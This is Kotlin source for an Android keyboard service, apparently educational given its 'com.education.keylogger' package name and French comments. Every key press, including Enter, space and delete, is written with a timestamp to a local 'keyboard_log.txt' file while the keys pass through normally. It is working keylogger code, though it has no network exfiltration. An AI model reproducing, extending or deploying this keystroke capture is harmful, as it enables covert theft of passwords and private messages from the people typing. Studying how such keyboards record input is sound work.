package com.education.keylogger

import android.inputmethodservice.InputMethodService
import android.view.KeyEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import java.io.FileWriter
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class MyKeyboardService : InputMethodService() {
    
    private val logFileName = "keyboard_log.txt"
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    
    override fun onCreate() {
        super.onCreate()
        logToFile("=== Keyboard Service Started ===")
    }
    
    override fun onCreateInputView(): View {
        // Créer ou charger votre layout de clavier personnalisé
        return layoutInflater.inflate(R.layout.keyboard_view, null)
    }
    
    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        val keyChar = event.unicodeChar.toChar()
        val timestamp = dateFormat.format(Date())
        
        when {
            keyCode == KeyEvent.KEYCODE_ENTER -> {
                logToFile("$timestamp - [ENTER]")
            }
            keyCode == KeyEvent.KEYCODE_SPACE -> {
                logToFile("$timestamp - [ESPACE]")
            }
            keyCode == KeyEvent.KEYCODE_DEL -> {
                logToFile("$timestamp - [SUPPR]")
            }
            keyChar.isLetterOrDigit() || keyChar.isWhitespace() -> {
                logToFile("$timestamp - $keyChar")
            }
            else -> {
                logToFile("$timestamp - [${KeyEvent.keyCodeToString(keyCode)}]")
            }
        }
        
        // Passer l'événement au système
        return super.onKeyDown(keyCode, event)
    }
    
    private fun logToFile(message: String) {
        try {
            val file = filesDir.resolve(logFileName)
            FileWriter(file, true).use { writer ->
                writer.appendLine(message)
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
    
    override fun onDestroy() {
        logToFile("=== Keyboard Service Stopped ===")
        super.onDestroy()
    }
}
